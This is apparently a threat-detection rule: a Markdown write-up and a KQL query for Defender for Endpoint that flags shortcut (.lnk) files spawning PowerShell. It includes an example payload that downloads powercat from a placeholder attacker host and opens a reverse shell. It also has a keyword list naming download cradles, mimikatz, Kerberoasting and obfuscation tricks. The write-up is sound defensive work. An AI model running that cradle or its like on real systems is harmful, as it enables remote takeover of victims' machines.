# LNK File Launching PowerShell Detection

## Overview

Detects `.lnk` (shortcut) files that launch PowerShell processes, a common initial access and execution technique. Attackers craft malicious shortcut files that, when opened by a user, execute PowerShell commands — typically download cradles that fetch and run remote payloads. This is frequently delivered via phishing emails, USB drops, or placed in shared folders.

The attached example demonstrates a classic pattern: a `.lnk` file executing PowerShell with `Invoke-Expression` to download and run a reverse shell script. However, the detection is broader and covers any `.lnk`-initiated PowerShell execution that exhibits suspicious characteristics.

**Example payload:**
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker>:8000/powercat.ps1'); powercat -c <attacker> -p 4444 -e powershell"
```

## MITRE ATT&CK

| Field | Value |
|-------|-------|
| **Tactic** | Execution, Initial Access |
| **Techniques** | T1204.002 - User Execution: Malicious File |
| | T1059.001 - Command and Scripting Interpreter: PowerShell |
| | T1566.001 - Phishing: Spearphishing Attachment |

## Data Source

- `DeviceProcessEvents` (Defender for Endpoint)

## Detection Logic

1. **Identify** PowerShell processes where the initiating process or its parent is `explorer.exe` — this is the typical chain when a user double-clicks a `.lnk` file from Explorer.
2. **Check** that the process creation trace references a `.lnk` file, either in the `InitiatingProcessCommandLine` or the `ProcessCommandLine` itself.
3. **Score** the PowerShell command line for suspicious indicators including download cradles, encoded commands, execution policy bypasses, reverse shell patterns, common offensive tooling, and obfuscation techniques.
4. **Filter out** known legitimate software that uses `.lnk` files to invoke PowerShell, such as application shortcuts created by enterprise software or developer tools.

## Customization

- **FP exclusions:** Review and extend the `FPCommandPatterns` and `FPPaths` lists based on legitimate `.lnk`-to-PowerShell usage in your environment. Run the query without the final score filter first to baseline.
- **Score threshold:** The default threshold of `>= 1` catches any match. Raise it if your environment is noisy, or use it for tiered alerting (e.g., score >= 3 as high severity).

## Query

```kql
// ============================================================================
// LNK File Launching PowerShell Detection
// Detects .lnk (shortcut) files that spawn PowerShell with suspicious
// command-line arguments, a common initial access technique delivered via
// phishing or malicious file shares.
//
// Data source: DeviceProcessEvents (Defender for Endpoint)
//
// MITRE ATT&CK:
//   T1204.002 - User Execution: Malicious File
//   T1059.001 - Command and Scripting Interpreter: PowerShell
//   T1566.001 - Phishing: Spearphishing Attachment
// ============================================================================
// Known false positive patterns in command lines
let FPCommandPatterns = dynamic([
    "visualstudiocode",
    "vscode",
    "microsoft.windowsterminal",
    "onenote",
    "windowspackagemanager"
]);
// Known legitimate paths that may spawn PowerShell via .lnk
let FPPaths = dynamic([
    "\\program files\\",
    "\\program files (x86)\\",
    "\\programdata\\microsoft\\"
]);
let SuspiciousPatterns = dynamic([
    // Download cradles
    "downloadstring",
    "downloadfile",
    "downloaddata",
    "invoke-webrequest",
    "start-bitstransfer",
    "net.webclient",
    "net.sockets",
    "bitstransfer",
    "xml.xmldocument",
    // Execution
    "invoke-expression",
    "iex(",
    "iex ",
    "invoke-command",
    // Encoded / hidden execution
    "-enc ",
    "-encodedcommand",
    "-w hidden",
    "-windowstyle hidden",
    "-nop",
    "-noprofile",
    "-ep bypass",
    "-executionpolicy bypass",
    "-executionpolicy unrestricted",
    // Reverse shells / C2
    "powercat",
    "nishang",
    "invoke-powershelltcp",
    "invoke-shellcode",
    "system.net.sockets.tcpclient",
    "tcpclient",
    "new-object io.streamreader",
    // Credential access / offensive tools
    "mimikatz",
    "invoke-mimikatz",
    "sekurlsa",
    "invoke-kerberoast",
    "invoke-bloodhound",
    "sharphound",
    // Obfuscation
    "frombase64string",
    "gzipstream",
    "deflatestream",
    "memorystream",
    "-join",
    "[char]",
    "-bxor",
    "-replace",
    // Persistence
    "new-scheduledtask",
    "register-scheduledtask",
    "new-itemproperty",
    "set-itemproperty"
]);
DeviceProcessEvents
| where Timestamp > ago(24h)
| where FileName in~ ("powershell.exe", "pwsh.exe")
// LNK execution chain: Explorer spawns the process directly or via cmd.exe
| where InitiatingProcessFileName in~ ("explorer.exe", "cmd.exe")
    or InitiatingProcessParentFileName =~ "explorer.exe"
// Confirm .lnk involvement in the process chain
| where InitiatingProcessCommandLine has ".lnk"
    or ProcessCommandLine has ".lnk"
    or InitiatingProcessFileName =~ "explorer.exe"
// Filter out known false positives
| where not(ProcessCommandLine has_any (FPCommandPatterns))
| where not(tolower(InitiatingProcessFolderPath) has_any (FPPaths)
    and not(ProcessCommandLine has_any ("downloadstring", "iex", "invoke-expression", "-enc")))
// Score for suspicious content
| mv-apply Pattern = SuspiciousPatterns to typeof(string) on (
    summarize SuspiciousScore = countif(ProcessCommandLine has Pattern)
)
| where SuspiciousScore >= 1
| project
    Timestamp,
    DeviceName,
    AccountName = InitiatingProcessAccountName,
    SuspiciousScore,
    ProcessCommandLine,
    FileName,
    FolderPath,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine,
    InitiatingProcessParentFileName,
    SHA256,
    ReportId
| sort by SuspiciousScore desc, Timestamp desc
```
